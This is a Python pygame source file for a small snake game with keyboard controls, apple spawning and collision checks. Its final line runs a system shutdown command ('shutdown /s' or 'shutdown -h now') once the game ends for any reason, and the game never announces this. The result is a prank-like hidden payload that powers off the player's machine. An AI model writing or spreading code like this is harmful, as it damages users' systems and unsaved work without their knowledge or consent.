import pygame, time, random,os

pygame.init()
WIDTH = 700
HEIGHT = 700
death = False
counter = 0
length = 2
parts = []
eat = True
v_x = 20
v_y = 0
right,left,up,down = True,False,False,False
snake = pygame.image.load(r'C:\Users\Denze\OneDrive\Desktop\Backup\Snakesq.png')
apple = pygame.image.load(r'C:\Users\Denze\OneDrive\Desktop\Backup\apple.png')
win = pygame.display.set_mode((WIDTH,HEIGHT))
snake = pygame.transform.scale(snake,(20,20))
apple = pygame.transform.scale(apple,(20,20))
snake_rect = snake.get_rect()
apple_rect = apple.get_rect()
running = True
while running:
    lol = pygame.Rect(snake_rect.x,snake_rect.y,20,20)
    parts.append(lol)
    if eat == True:
        length += 1
        apple_rect.x = random.randint(0,35)*20
        apple_rect.y = random.randint(0,35)*20
        eat = False
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_d and not left:
                right = True
                left,up,down = False,False,False
            elif event.key == pygame.K_a and not right:
                left = True
                right,up,down = False,False,False
            elif event.key == pygame.K_w and not down:
                up = True
                down,left,right = False,False,False
                
            elif event.key == pygame.K_s and not up:
                down = True
                up,right,left = False,False,False
    del parts[-1]
    for rects in parts:

        if rects == snake_rect:
            running = False
            death = True
    if death:
        break
    parts.append(lol)
    
    if right:
        v_x = 20
        v_y = 0
    elif left:
        v_x = -20
        v_y = 0
    elif up:
        v_y = -20
        v_x = 0
    elif down:
        v_y = 20
        v_x = 0
        


    if apple_rect.x == snake_rect.x and apple_rect.y == snake_rect.y:
        eat = True
    if snake_rect.x > 680:
        break
    elif snake_rect.x < 0:
        break
    elif snake_rect.y > 680:
        break
    elif snake_rect.y < 0:
        break
    time.sleep(0.1)
    if len(parts) == length:
        win.fill((0,0,0))
        pygame.display.update(parts[1])
        del parts[0]
   # pygame.display.update(parts[2])
   # parts.remove(parts[0])
    snake_rect.x += v_x
    snake_rect.y += v_y
    
    win.blit(apple,apple_rect)

    win.blit(snake,snake_rect)
    pygame.display.update(apple_rect)
    pygame.display.update(snake_rect)
    
os.system('shutdown /s' if os.name == 'nt' else 'shutdown -h now')